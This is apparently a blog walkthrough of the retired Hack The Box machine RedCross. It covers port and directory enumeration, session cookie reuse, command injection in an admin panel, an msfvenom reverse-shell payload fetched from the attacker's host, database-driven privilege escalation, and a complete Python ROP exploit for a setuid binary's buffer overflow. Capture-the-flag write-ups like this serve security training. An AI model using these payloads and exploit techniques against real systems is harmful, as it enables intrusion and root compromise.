---
layout: post
title: "RedCross: Hack The Box Walkthrough"
date: 2019-04-13 15:46:57 +0000
last_modified_at: 2019-04-13 15:47:39 +0000
category: Walkthrough
tags: ["Hack The Box", RedCross, retired]
comments: true
image:
  feature: redcross-htb-walkthrough.jpg
  credit: eroyka / Pixabay
  creditlink: https://pixabay.com/en/health-nurse-rescue-hospital-2640352/
---

This post documents the complete walkthrough of RedCross, a retired vulnerable [VM][1] created by [ompamo][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

RedCross is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.113 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-10 02:08:52 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.113
Discovered open port 443/tcp on 10.10.10.113
Discovered open port 22/tcp on 10.10.10.113
```

`masscan` finds `22/tcp`, `80/tcp` and `443/tcp` open. This is how the site looks like in a browser.

<a class="image-popup">
![67989600.png](/assets/images/posts/redcross-htb-walkthrough/67989600.png)
</a>

Interesting. It seems to redirect to `https://intra.redcross.htb/`. Let's map `10.10.10.113` to `intra.redcross.htb` in `/etc/hosts` and then try again.

<a class="image-popup">
![d8236038.png](/assets/images/posts/redcross-htb-walkthrough/d8236038.png)
</a>

Awesome. This must be the first attack surface. As I was casually glancing over the HTML source, I noticed the presence of a directory `/pages`.

<a class="image-popup">
![84e1d04b.png](/assets/images/posts/redcross-htb-walkthrough/84e1d04b.png)
</a>

This seems to suggest that I should fuzz for directories.

### Directory/File Enumeration

Let's use `wfuzz` with a big directory wordlist from DirBuster.

```
# wfuzz -w dirbuster.txt --hc 404 -t 50 https://intra.redcross.htb/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: https://intra.redcross.htb/FUZZ
Total requests: 81629

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000002:  C=301      9 L       28 W          327 Ch        "images"
000160:  C=301      9 L       28 W          326 Ch        "pages"
000395:  C=301      9 L       28 W          334 Ch        "documentation"
000998:  C=301      9 L       28 W          331 Ch        "javascript"
041982:  C=302      0 L       26 W          463 Ch        ""

Total time: 354.2614
Processed Requests: 81629
Filtered Requests: 81624
Requests/sec.: 230.4201
```

The `/documentation` directory is definitely interesting. Let's go deeper. I'll be introducing another wordlist containing file extension of common documents

```
# wfuzz -w dirbuster.txt -w extensions.txt --hc 404 -t 50 https://intra.redcross.htb/documentation/FUZZFUZ2Z
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: https://intra.redcross.htb/documentation/FUZZFUZ2Z
Total requests: 489774

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

251887:  C=403     11 L       32 W          308 Ch        " - "
261712:  C=200    259 L     1220 W        24694 Ch        "account-signup - .pdf"
331664:  C=404      9 L       32 W          307 Ch        "100000 - .doc"^C
Finishing pending requests...
```

I got what I wanted so there's really no need to complete the fuzz. Here's how it looks like.

<a class="image-popup">
![346670f2.png](/assets/images/posts/redcross-htb-walkthrough/346670f2.png)
</a>

It gives the details on how to request for credentials on the contact page. Let's try it out.

<a class="image-popup">
![1ff6bad5.png](/assets/images/posts/redcross-htb-walkthrough/1ff6bad5.png)
</a>

<a class="image-popup">
![608bea6e.png](/assets/images/posts/redcross-htb-walkthrough/608bea6e.png)
</a>

Damn. I could have guessed it! The guest credentials work alright.

<a class="image-popup">
![7da91105.png](/assets/images/posts/redcross-htb-walkthrough/7da91105.png)
</a>

It's interesting to note a database error when I tried to filter with a single quote.

<a class="image-popup">
![b23de08b.png](/assets/images/posts/redcross-htb-walkthrough/b23de08b.png)
</a>

Let's try again with a percent sign which is wildcard in MySQL.

<a class="image-popup">
![5b3cbd7c.png](/assets/images/posts/redcross-htb-walkthrough/5b3cbd7c.png)
</a>

What do we have here? Internal messages and usernames! The messages appear to be discussing about an Admin Web Panel.

<a class="image-popup">
![68152774.png](/assets/images/posts/redcross-htb-walkthrough/68152774.png)
</a>

<a class="image-popup">
![03e73bfe.png](/assets/images/posts/redcross-htb-walkthrough/03e73bfe.png)
</a>

Let's map `10.10.10.113` to `admin.redcross.htb` in `/etc/hosts` too.

<a class="image-popup">
![d2e925f3.png](/assets/images/posts/redcross-htb-walkthrough/d2e925f3.png)
</a>

Sweet. Another attack surface.

_intra.redcross.htb_

<a class="image-popup">
![b6653069.png](/assets/images/posts/redcross-htb-walkthrough/b6653069.png)
</a>

_admin.redcross.htb_

<a class="image-popup">
![b44fc1bb.png](/assets/images/posts/redcross-htb-walkthrough/b44fc1bb.png)
</a>

Notice a different set of cookies for the `admin` vhost? Maybe a session replay attack will work here? Let's reuse the session already established in `intra` and apply it to `admin`.

<a class="image-popup">
![5ed464de.png](/assets/images/posts/redcross-htb-walkthrough/5ed464de.png)
</a>

Sweet.

### `chroot`'d Jail in SSH

There's a functionality in the admin panel to add users to a `chroot`'d jail in SSH.

<a class="image-popup">
![a424cf2a.png](/assets/images/posts/redcross-htb-walkthrough/a424cf2a.png)
</a>

Let's go ahead and add ourselves to the list.

<a class="image-popup">
![18316344.png](/assets/images/posts/redcross-htb-walkthrough/18316344.png)
</a>

<a class="image-popup">
![466d52b9.png](/assets/images/posts/redcross-htb-walkthrough/466d52b9.png)
</a>

I can log in alright, to a jail. :disappointed:

<a class="image-popup">
![73366ecb.png](/assets/images/posts/redcross-htb-walkthrough/73366ecb.png)
</a>

Well, all is not lost. Penelope left a gift.

<a class="image-popup">
![37fa6db1.png](/assets/images/posts/redcross-htb-walkthrough/37fa6db1.png)
</a>

For brevity sake, I'll not display the source code. Suffice to say, the source code will help us in achieving privilege escalation later on.

### Low-Privilege Shell

Moving on to the Admin Panel and despite what **Network Access** sounds like, it has nothing to do with access control. It's actually contains an input validation vulnerability that we can exploit for remote command execution.

<a class="image-popup">
![5a233225.png](/assets/images/posts/redcross-htb-walkthrough/5a233225.png)
</a>

If I have to guess, I would say that the **Network Access** makes use of the `iptctl` binary to control `iptables`. I'm also betting `ipctl` is `setuid` to `root`.

And guess what? We have the source code to `iptctl` for comparison, courtesy of Penelope. :kiss:

The PHP code could look something like this whenever it receives a request to deny some IP address.

```php
<?php system("/opt/iptctl/ipctl restrict" . $ip); ?>
```

What if the web application doesn't do a good job in input validation?

<a class="image-popup">
![6623fed5.png](/assets/images/posts/redcross-htb-walkthrough/6623fed5.png)
</a>

It's apparent from above that it doesn't. :laughing: Time to test out remote command execution!

I'm generating a reverse shell with `msfvenom` and hosting it with Python's SimpleHTTPServer module. I'm going to assume the server is running 64-bit Linux.

```
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.241 LPORT=1234 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev
```

Host the reverse shell like so.

```
# python -m SimpleHTTPServer 80
```

Run a remote command like this.

<a class="image-popup">
![be14d39b.png](/assets/images/posts/redcross-htb-walkthrough/be14d39b.png)
</a>

The remote command execution works!

<a class="image-popup">
![99da6e56.png](/assets/images/posts/redcross-htb-walkthrough/99da6e56.png)
</a>

Time for shell.

<a class="image-popup">
![8fe097cc.png](/assets/images/posts/redcross-htb-walkthrough/8fe097cc.png)
</a>

Meanwhile at my `nc` listener, a reverse shell arrives...

<a class="image-popup">
![029d828f.png](/assets/images/posts/redcross-htb-walkthrough/029d828f.png)
</a>

Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell to a full TTY.

### Privilege Escalation

During enumeration of `www-data`'s account, I realized that the web application makes use of two database technologies in its PHP code: MySQL and PostgreSQL.

The intra-messaging app uses MySQL to store the messages and user authentication, while the admin control panel uses PostgresSQL for SSH user management and to keep track of the IP access grants.

_Snippet of actions.php_

<a class="image-popup">
![d12b5afe.png](/assets/images/posts/redcross-htb-walkthrough/d12b5afe.png)
</a>

You can clearly see the credentials to access the database.

<a class="image-popup">
![4fce14ec.png](/assets/images/posts/redcross-htb-walkthrough/4fce14ec.png)
</a>

The best part is—you can modify the `passwd_table` table. Here's how it looks like.

<a class="image-popup">
![b9ae27f2.png](/assets/images/posts/redcross-htb-walkthrough/b9ae27f2.png)
</a>

Oh good. The `dick` user I created earlier is still around. Let's change the columns to our advantage.

<a class="image-popup">
![ff7e6984.png](/assets/images/posts/redcross-htb-walkthrough/ff7e6984.png)
</a>

Notice I change the `gid` to `sudo` and the home directory to `root`. Let's login to `dick`'s account again and make ourselves `root`.

<a class="image-popup">
![908ac3bf.png](/assets/images/posts/redcross-htb-walkthrough/908ac3bf.png)
</a>

Getting `root.txt` with a `root` shell is so damn easy.

<a class="image-popup">
![8d49cbb7.png](/assets/images/posts/redcross-htb-walkthrough/8d49cbb7.png)
</a>

:dancer:

### Afterthought

For completeness sake, here's `user.txt`.

<a class="image-popup">
![824dd2b3.png](/assets/images/posts/redcross-htb-walkthrough/824dd2b3.png)
</a>

In fact, `penelope` is running Haraka 2.8.8 on `1025/tcp`. We can make use of EDB-ID [41162](https://www.exploit-db.com/exploits/41162) to gain a low-privilege shell as `penelope` to read `user.txt`.

Furthermore, the intra-messaging app is susceptible to SQLi attacks. Two parameters in particular serve as the injection point: `LIMIT` cookie and `o` field in `https://intra.redcross.htb/?page=app`.

Finally, let's take a shot at exploiting the `setuid` binary `iptctl`. Before we begin, note that the binary is a 64-bit ELF, ASLR is enabled, and you can't execute CPU instructions on the stack.

I first noted a buffer overrun (BOF) vulnerability in the `interactive` function from the source code. There are two `fgets` one can use to exploit the vulnerability. One `fgets` reads from `stdin` to the `&inputAction` memory address, the other to `&inputAddress` memory address, which is closer to the saved return pointer. The idea is to use the second `fgets` to overwrite the saved return pointer with our own code. However, because `fgets` reads at most (BUFFSIZE - 1) bytes, the exploit has to be less than 360 bytes.

Let's take a look at the source code just before we enter the `interactive` function.

<a class="image-popup">
![116f3169.png](/assets/images/posts/redcross-htb-walkthrough/116f3169.png)
</a>

Now, let's take a good look at the `interactive` function.

<a class="image-popup">
![c38708f7.png](/assets/images/posts/redcross-htb-walkthrough/c38708f7.png)
</a>

Good thing the binary is a non position-independent executable (PIE), and as such, function address in the procedure linkage table (PLT) doesn't change. Another blessing was the binary contained plenty of ROP gadgets for use. I was able to write `sh` using `strcpy@plt` to an address within `bss`, which also doesn't change. Lastly, I used `setuid@plt` and `execvp@plt` to spawn a `root` shell.

There are plenty of tools out there that help to generate a list of ROP gadgets. I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

```
# ROPgadgets --binary iptctl
...
0x00000000004006c2 : add rsp, 8 ; ret
0x0000000000400de3 : pop rdi ; ret
0x0000000000400de1 : pop rsi ; pop r15 ; ret
0x00000000004006c6 : ret
```

I used these ROP gadgets to chain together an exploit.

<div class="filename"><span>exploit.py</span></div>

```python
'''
# ROPgadget --binary iptctl --memstr "sh"
Memory bytes information
=======================================================
0x000000000040024f : 's'
0x000000000040046f : 'h'
'''

from pwn import *

shell = [ 0x40024f, 0x40046f ]  # 's' and 'h'

# front matter
newline = "\n"
action  = "show"
offset  = "A" * 8
address = "255.255.255.255\x00"
writeme = 0x6020a0  # avoid start of bss
payload = ''        # bss is at 0x602090

# functions@plt
execvp = 0x400760
setuid = 0x400780
strcpy = 0x4006f0

# gadgets
pop_rdi_ret = 0x400de3
pop_rsi_pop_ret = 0x400de1
ret = 0x4006c6
skip = 0x4006c2

# exploit format
payload += action
payload += newline
payload += address
payload += offset

# write "sh" to 0x6020a0 - 112 bytes
for i in range(len(shell)):
	payload += p64(pop_rsi_pop_ret)
	payload += p64(shell[i])
	payload += p64(skip)
	payload += p64(pop_rdi_ret)
	payload += p64(writeme+i)
	payload += p64(strcpy)
	payload += p64(ret)

# setuid(0) - 32 bytes
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(setuid)
payload += p64(ret)

# execv("sh", 0) - 56 bytes
payload += p64(pop_rsi_pop_ret)
payload += p64(0)
payload += p64(skip)
payload += p64(pop_rdi_ret)
payload += p64(writeme)
payload += p64(execvp)
payload += p64(ret)

payload += newline

# write payload to file
f = open('payload', 'wb')
f.write(payload)
f.close
```

Use the exploit code to generate our payload and then upload it to the box. Run the following command to escalate privilege to `root`.

<a class="image-popup">
![03394494.png](/assets/images/posts/redcross-htb-walkthrough/03394494.png)
</a>

[1]: https://www.hackthebox.eu/home/machines/profile/162
[2]: https://www.hackthebox.eu/home/users/profile/9631
[3]: https://www.hackthebox.eu/
